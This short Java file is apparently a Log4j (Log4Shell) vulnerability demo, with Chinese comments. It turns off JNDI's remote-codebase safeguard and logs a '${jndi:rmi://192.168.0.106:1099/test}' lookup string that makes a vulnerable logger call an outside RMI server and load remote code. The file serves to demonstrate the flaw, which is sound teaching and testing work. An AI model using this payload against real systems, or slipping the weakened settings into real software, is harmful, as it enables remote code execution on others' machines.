package io.binghe.log4j; /**
 * Copyright 2020-9999 the original author or authors.
 * <p>
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 * <p>
 * http://www.apache.org/licenses/LICENSE-2.0
 * <p>
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import javax.naming.spi.ObjectFactory;

/**
 * @author binghe (公众号：冰河技术)
 * @version 1.0.0
 * @description Log4j漏洞示例
 */
public class Log4jDemo {

    private static final Logger LOGGER = LogManager.getLogger();

    public static void main(String[] args){
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
        try {
//        String str = "binghe";
//        String str = "${java:os}";
//        String str = "${java:runtime}";
//        String str = "${java:vm}";

            String str = "${jndi:rmi://192.168.0.106:1099/test}";


            LOGGER.info("输出的信息是:{}", str);
        }catch (Exception e){}
    }
}
